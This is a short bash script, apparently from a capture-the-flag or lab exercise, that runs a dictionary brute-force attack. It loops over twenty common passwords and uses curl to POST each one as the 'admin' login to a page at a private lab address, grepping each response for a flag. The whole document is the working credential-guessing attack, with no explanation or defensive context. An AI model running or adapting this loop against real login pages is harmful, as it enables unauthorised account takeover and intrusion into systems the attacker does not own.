password=(123456 password 12345 12345678 qwerty 123456789 1234 baseball dragon football 1234567 monkey letmein abc123 111111 mustang access shadow master michael)

for i in ${password[@]}; do
    echo "${i}"
	curl -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done
